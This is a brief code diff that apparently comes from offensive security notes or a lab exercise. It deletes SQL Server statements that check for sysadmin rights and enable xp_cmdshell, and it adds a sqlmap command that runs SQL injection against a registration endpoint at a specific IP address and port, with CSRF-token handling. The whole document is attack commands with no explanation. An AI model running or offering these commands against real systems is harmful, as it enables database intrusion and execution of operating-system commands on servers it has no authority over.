@@ -1,8 +1,1 @@
-SELECT IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin;
-GO
-
-EXEC sp_configure 'show advanced options', 1;
-RECONFIGURE;
-EXEC sp_configure 'xp_cmdshell', 1;
-RECONFIGURE;
-GO
+sqlmap -r register_req.txt --csrf-token="csrf_token_field_name" --csrf-url="http://94.237.61.248:33957/register"
